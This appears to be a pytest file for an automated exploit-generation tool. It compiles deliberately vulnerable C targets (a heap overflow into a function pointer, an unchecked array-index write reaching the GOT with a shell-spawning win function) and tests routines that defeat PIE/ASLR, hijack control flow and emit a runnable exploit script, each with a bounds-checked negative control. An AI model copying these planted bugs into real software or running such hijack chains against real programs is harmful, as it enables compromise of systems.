"""Primitive chaining: payload shaping + CWE->technique recipe selection (pure helpers).

The live control-flow demonstration (drive the primitive to overwrite a code pointer and confirm
the win under ptrace) is exercised end-to-end by the stage on a real target; here we cover the
deterministic building blocks."""
import shutil
import struct
import subprocess

import pytest
from lykos.analyze.dynamic import sandbox
from lykos.analyze.poc import chain_primitive as chain


def test_p64_little_endian():
    assert chain._p64(0x40129d) == struct.pack("<Q", 0x40129d)
    assert chain._p64(-1) == b"\xff" * 8                     # masked to 64 bits


def test_drive_overflow_puts_payload_in_last_string_field():
    # edit flow [idx, str]: id then the overflow buffer
    out = chain._drive_overflow(["idx", "str"], b"PAY", idx=b"0")
    assert out == b"0\nPAY\n"
    # add flow [num, str]: the size is driven large (unbounded copy), payload in the string
    out = chain._drive_overflow(["num", "str"], b"XX")
    assert out == b"999\nXX\n"
    # multiple strings: only the LAST carries the payload
    out = chain._drive_overflow(["str", "str"], b"P")
    assert out == b"AAAA\nP\n"
    # no learned fields: still delivers the payload
    assert chain._drive_overflow([], b"P") == b"P\n"


def test_vclass_maps_every_primitive_cwe():
    assert chain._VCLASS["CWE-415"] == "double_free"
    assert chain._VCLASS["CWE-416"] == "uaf"
    assert chain._VCLASS["CWE-122"] == "heap_overflow"
    assert chain._VCLASS["CWE-129"] == "oob_write"


def test_recipe_control_flow_when_win_reachable():
    # a heap primitive with a reachable win -> an aaheg technique + the win as the transfer target
    r = chain._recipe("heap_overflow", ("win", 0x40129d), b"")
    assert r.get("technique")                                 # a concrete technique was chosen
    # oob is not a heap technique: it writes through the escaped array slot
    r2 = chain._recipe("oob_write", ("win", 0x1234), b"")
    assert r2["technique"] == "oob-index-write"
    assert "out-of-bounds" in r2["note"].lower()


def test_recipe_arbitrary_write_without_win():
    r = chain._recipe("uaf", None, b"")
    assert r.get("technique") or r.get("advisory_alternatives") or r.get("reason")


# --- PIE leak-then-chain: recover the base in-process, relocate the win, confirm by flag ---------
import tempfile  # noqa: E402
from pathlib import Path  # noqa: E402

from lykos.analyze.poc.exploit import elf_functions  # noqa: E402


def _pie_heapwin_src(copy_len: str) -> str:
    """The menu-driven PIE heap target, parameterised ONLY by the edit's memcpy length, so the
    positive (an overflow past buf into the adjacent fn pointer) and its negative control (the copy
    bounded to the buffer) are byte-identical but for that expression (supwngo _90_neg).
    """
    return (r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
long banner = 0xdead;
void win(void){ puts("FLAG{pie-heap-chain}"); fflush(stdout); _exit(42); }
void hello(void){ puts("hello"); }
struct obj { char buf[32]; void (*fn)(void); };
static struct obj *o;
static int rd(char *p,int n){ int k=read(0,p,n); if(k<0)k=0; p[k]=0; return k; }
static long num(void){ char b[32]; rd(b,31); return strtol(b,0,0); }
int main(void){
  setvbuf(stdout,0,_IONBF,0);
  o=malloc(sizeof *o); o->fn=hello;
  for(;;){ puts("1)new 2)edit 3)leak 4)run 5)quit");
    switch(num()){
      case 1: o=malloc(sizeof *o); o->fn=hello; break;
      case 2: { char b[64]; int k=rd(b,64); memcpy(o->buf,b,""" + copy_len + r"""); } break;
      case 3: printf("leak main=%p cfg=%p\n",(void*)main,(void*)&banner); break;
      case 4: o->fn(); break;
      case 5: return 0;
    }
  }
}
""")


_PIE_HEAPWIN = _pie_heapwin_src("k")                              # overflow past buf: the bug
_PIE_HEAPSAFE = _pie_heapwin_src("k>(int)sizeof o->buf?(int)sizeof o->buf:k")  # bounded


class _FakeCtx:
    def should_cancel(self): return False
    def progress(self, **k): pass


def _build_pie_heap(tmp_path_factory, name, src):
    if sandbox.host_arch() != "x86-64":
        pytest.skip("PIE leak-chain is x86-64 native only")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    d = tmp_path_factory.mktemp(name); c = d / "m.c"; c.write_text(src)
    out = d / "target.bin"
    if subprocess.run([gcc, "-O0", "-fno-stack-protector", "-pie", "-fPIE", str(c),
                       "-o", str(out)], capture_output=True).returncode != 0:
        pytest.skip("cannot build PIE heap target")
    return out


@pytest.fixture
def pie_heapwin_bin(tmp_path_factory):
    return _build_pie_heap(tmp_path_factory, "pieheap", _PIE_HEAPWIN)


@pytest.fixture
def pie_heapsafe_bin(tmp_path_factory):
    return _build_pie_heap(tmp_path_factory, "pieheapsafe", _PIE_HEAPSAFE)


def test_pie_leak_chain_recovers_base_and_hijacks(pie_heapwin_bin):
    """The interactive PIE chainer finds the leak option, recovers the base in-process, drives the
    overflow to overwrite the adjacent fn pointer, and confirms the win RAN (flag output) under a
    negative control -- no analyst input, ASLR on (relative to the binary)."""
    wd = Path(tempfile.mkdtemp(prefix="pchain-"))
    try:
        tb = pie_heapwin_bin.read_bytes()
        win_vaddr = elf_functions(tb)["win"]
        hit = chain._pie_leak_chain(_FakeCtx(), tb, str(pie_heapwin_bin), ("win", win_vaddr),
                                    opts=["1", "2", "3", "4", "5"], model={"2": ["str"]},
                                    width=None, workdir=wd)
        assert hit is not None, "PIE leak-chain not confirmed"
        leak_opt, writer, off, trig, base = hit
        assert leak_opt == "3" and writer == "2" and off == 32   # leak, edit-overflow, buf[32]
        assert base and base % 0x1000 == 0
    finally:
        shutil.rmtree(wd, ignore_errors=True)


def test_pie_leak_chain_declines_the_patched_target(pie_heapsafe_bin):
    """Negative control (supwngo _90_neg): the SAME target with the edit's memcpy bounded to the
    buffer cannot reach the adjacent fn pointer, so the chainer must NOT confirm a hijack. The leak
    option, the win function, and every menu path are still present and reachable, so a `None` here
    is attributable to the missing overflow alone -- a non-None result would be a hijack claimed
    without a bug, which the win-ran-under-a-negative-control confirmation exists to prevent."""
    wd = Path(tempfile.mkdtemp(prefix="pchainsafe-"))
    try:
        tb = pie_heapsafe_bin.read_bytes()
        win_vaddr = elf_functions(tb)["win"]
        hit = chain._pie_leak_chain(_FakeCtx(), tb, str(pie_heapsafe_bin), ("win", win_vaddr),
                                    opts=["1", "2", "3", "4", "5"], model={"2": ["str"]},
                                    width=None, workdir=wd)
        assert hit is None, f"patched target wrongly confirmed a hijack: {hit}"
    finally:
        shutil.rmtree(wd, ignore_errors=True)


def test_pie_repro_script_reproduces_standalone(pie_heapwin_bin):
    """The bundled reproducer is a real, runnable ASLR defeat: it recovers the base from the
    target's own symbols and re-drives the hijack to print the flag."""
    tb = pie_heapwin_bin.read_bytes()
    script = chain._pie_repro_script("win", elf_functions(tb)["win"], "3", "2", 32, "4")
    import sys as _sys
    d = pie_heapwin_bin.parent
    (d / "exploit.py").write_bytes(script)
    r = subprocess.run(["setarch", "-R", _sys.executable, str(d / "exploit.py"),
                        str(pie_heapwin_bin)], capture_output=True, timeout=30)
    assert b"FLAG{pie-heap-chain}" in r.stdout, r.stdout + r.stderr


# --- CWE-129/787 indexed write-what-where -> control-flow hijack (no-PIE, GOT overwrite) ---------
def _oobwrite_src(guard: str) -> str:
    """A menu-driven unchecked array-index WRITE target, parameterised ONLY by the index guard on
    the `set` option, so the positive (no bound check -> arr[-9] reaches printf@GOT) and its
    negative control (the write bounded to the array) are byte-identical but for that expression."""
    return (r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
long arr[8];
__attribute__((used)) void win(void){ system("/bin/sh"); _exit(0); }
int main(void){
  setbuf(stdout,0);
  long idx,val; int choice;
  for(;;){
    printf("1. set\n2. get\n3. exit\n> ");
    if(scanf("%d",&choice)!=1) break;
    if(choice==1){
      printf("index: "); if(scanf("%ld",&idx)!=1) break;
      printf("value: "); if(scanf("%ld",&val)!=1) break;
      """ + guard + r"""
    } else if(choice==2){
      printf("index: "); if(scanf("%ld",&idx)!=1) break;
      printf("%ld\n",arr[idx]);
    } else break;
  }
  return 0;
}
""")


_OOBWRITE_BUG = _oobwrite_src("arr[idx]=val;")                       # unchecked: write-what-where
_OOBWRITE_SAFE = _oobwrite_src("if(idx>=0&&idx<8) arr[idx]=val;")    # bounded: no escape


class _CapCtx:
    """ctx for the live indexed-write hijack: should_cancel / progress / run_subprocess, enough to
    drive make_capture's ptrace helper directly (no worker, no sandbox)."""
    def should_cancel(self): return False
    def progress(self, **k): pass
    def run_subprocess(self, cmd, timeout=None):
        return subprocess.run(cmd, capture_output=True, timeout=timeout)


def _build_nopie(tmp_path_factory, name, src):
    if sandbox.host_arch() != "x86-64":
        pytest.skip("indexed-write GOT hijack is x86-64 native only")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    d = tmp_path_factory.mktemp(name); c = d / "m.c"; c.write_text(src)
    out = d / "target.bin"
    if subprocess.run([gcc, "-O0", "-fno-stack-protector", "-no-pie", "-w", str(c), "-o", str(out)],
                      capture_output=True).returncode != 0:
        pytest.skip("cannot build no-PIE indexed-write target")
    return out


def _drive_oob_write_hijack(exe):
    import sys as _sys

    from lykos.analyze.poc.capture import make_capture, materialize_helper
    tb = exe.read_bytes()
    win_addr = elf_functions(tb)["win"]
    ctx = _CapCtx()
    helper = materialize_helper()
    try:
        cap = make_capture(ctx, helper, str(exe), "stdin", [], 8, _sys.executable)
        return chain._oob_write_hijack(ctx, cap, tb, exe, ["1", "2", "3"],
                                       {"1": ["idx", "num"], "2": ["idx"]}, win_addr, width=None)
    finally:
        shutil.rmtree(helper.parent, ignore_errors=True)


@pytest.fixture
def oobwrite_bug_bin(tmp_path_factory):
    return _build_nopie(tmp_path_factory, "oobwbug", _OOBWRITE_BUG)


@pytest.fixture
def oobwrite_safe_bin(tmp_path_factory):
    return _build_nopie(tmp_path_factory, "oobwsafe", _OOBWRITE_SAFE)


def test_oob_write_hijack_overwrites_got_and_reaches_win(oobwrite_bug_bin):
    """CWE-129/787: the unchecked `arr[idx]=val` set option is driven with the index that lands on
    printf@GOT and val=&win, so the loop's next printf enters win -- confirmed under the ptrace
    breakpoint with a passing negative control. The INDEX selects the address (a write-what-where),
    which is why a GOT slot well outside the 8-element array is reachable at all."""
    hit = _drive_oob_write_hijack(oobwrite_bug_bin)
    assert hit is not None, "indexed-write GOT hijack not confirmed"
    seq, writer, idx, tgt_addr, trig, tgt_name = hit
    assert writer == "1" and idx < 0                      # the `set` option, an underflow index
    assert tgt_name.endswith("@got")                      # a GOT slot was the write target
    assert str(idx).encode() in seq and str(elf_functions(oobwrite_bug_bin.read_bytes())["win"]
                                              ).encode() in seq


def test_oob_write_hijack_declines_the_bounds_checked_target(oobwrite_safe_bin):
    """Negative control: the SAME target with `if(idx>=0&&idx<8)` guarding the write cannot escape
    the array, so no GOT slot is reachable and the chainer must NOT confirm a hijack. The win
    function and every menu path are still present, so `None` is attributable to the bound check
    alone -- a non-None result would be a hijack claimed without a bug."""
    assert _drive_oob_write_hijack(oobwrite_safe_bin) is None


# ------------------------------------------------- attribution proof (Phase 1b integration)
class _ShimCtx:
    """Minimal ctx for `_attribution_proof`: it only needs a run_subprocess that returns an
    object with `.stdout` bytes. Runs the attribution helper directly (no worker/sandbox)."""
    def run_subprocess(self, cmd, timeout=None):
        return subprocess.run(cmd, capture_output=True, timeout=timeout)


_WINSRC = ("#include <stdio.h>\n#include <string.h>\nint main(){char b[64];"
           "if(fgets(b,sizeof b,stdin)){if(!strncmp(b,\"WIN\",3))puts(\"flag{chain}\");"
           "else puts(\"no\");}return 0;}\n")


@pytest.mark.skipif(sandbox.host_arch() != "x86-64" or not shutil.which("gcc"),
                    reason="attribution proof is native x86-64 only")
def test_attribution_proof_credits_only_an_attributed_differential_win(tmp_path):
    c = tmp_path / "w.c"; c.write_text(_WINSRC)
    exe = tmp_path / "w"
    if subprocess.run(["gcc", "-O0", str(c), "-o", str(exe)],
                      capture_output=True, check=False).returncode:
        pytest.skip("build failed")
    ctx = _ShimCtx()
    # the "win" input yields the banner from the target's OWN subtree, absent under the control
    good = chain._attribution_proof(ctx, exe, b"WIN\n")
    assert good and good["level"] == "win_attributed", good
    # a benign input produces no win banner -> not credited as a hijack
    benign = chain._attribution_proof(ctx, exe, b"zz\n")
    assert benign and benign["level"] == "output_attributed", benign


def test_attribution_proof_is_best_effort_without_exe():
    assert chain._attribution_proof(_ShimCtx(), None, b"x") is None
